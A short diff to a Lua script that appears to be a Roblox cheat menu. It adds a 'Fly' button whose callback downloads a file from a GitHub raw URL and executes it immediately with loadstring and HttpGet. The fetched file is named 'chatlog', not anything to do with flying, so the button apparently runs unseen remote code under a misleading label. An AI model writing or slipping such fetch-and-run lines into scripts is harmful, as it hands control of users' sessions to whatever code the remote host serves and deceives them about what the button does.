@@ -209,6 +209,13 @@ local Input = MainTab:CreateInput({
    end,
 })
 
+local FlyButton  = MainTab:CreateButton({
+   Name = "Fly",
+   Callback = function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/w1oxn-umcs/umcs/refs/heads/main/chatlog'))()
+end,
+})
+
 local GroupCheckToggle = MainTab:CreateToggle({
     Name = "Member Tag",
     CurrentValue = false,
